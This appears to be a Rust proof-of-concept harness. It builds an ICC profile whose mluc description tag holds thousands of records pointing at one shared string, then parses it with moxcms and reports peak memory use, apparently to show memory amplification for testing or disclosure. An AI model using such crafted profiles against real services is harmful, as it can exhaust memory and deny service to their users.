// Builds an RGB display profile whose 'desc' tag is an mluc with N records that all point at
// the same S-byte string, then parses it with moxcms and reports peak RSS (from /proc).
use moxcms::{ColorProfile, ParsingOptions};
fn be32(v: &mut Vec<u8>, x: u32) { v.extend_from_slice(&x.to_be_bytes()); }
fn vmhwm() -> String { std::fs::read_to_string("/proc/self/status").unwrap().lines().find(|l| l.starts_with("VmHWM")).unwrap().to_string() }
fn main() {
    let string_len: usize = std::env::args().nth(1).map(|s| s.parse().unwrap()).unwrap_or(16384);
    let records: usize = std::env::args().nth(2).map(|s| s.parse().unwrap()).unwrap_or(2000);
    // mluc tag: 'mluc' 0, count, rec size 12, then records (lang,country,len,offset), then string.
    let header_len = 16 + 12 * records;
    let mut tag = Vec::new();
    tag.extend_from_slice(b"mluc"); be32(&mut tag, 0); be32(&mut tag, records as u32); be32(&mut tag, 12);
    for _ in 0..records { tag.extend_from_slice(b"enUS"); be32(&mut tag, string_len as u32); be32(&mut tag, header_len as u32); }
    tag.extend(std::iter::repeat([0u8, b'A']).take(string_len / 2).flatten());
    // Profile: 128-byte header, tag table with one entry (desc), then the tag.
    let tag_off = 128 + 4 + 12;
    let size = tag_off + tag.len();
    let mut p = vec![0u8; 128];
    p[0..4].copy_from_slice(&(size as u32).to_be_bytes());
    p[8] = 2; p[9] = 0x40; // version 2.4
    p[12..16].copy_from_slice(b"mntr"); p[16..20].copy_from_slice(b"RGB "); p[20..24].copy_from_slice(b"XYZ ");
    p[36..40].copy_from_slice(b"acsp");
    be32(&mut p, 1); p.extend_from_slice(b"desc"); be32(&mut p, tag_off as u32); be32(&mut p, tag.len() as u32);
    p.extend_from_slice(&tag);
    println!("profile bytes: {}", p.len());
    println!("before: {}", vmhwm());
    let r = ColorProfile::new_from_slice_with_options(&p, ParsingOptions { max_profile_size: 4 << 20, ..Default::default() });
    println!("parsed ok: {}", r.is_ok());
    println!("after:  {}", vmhwm());
}
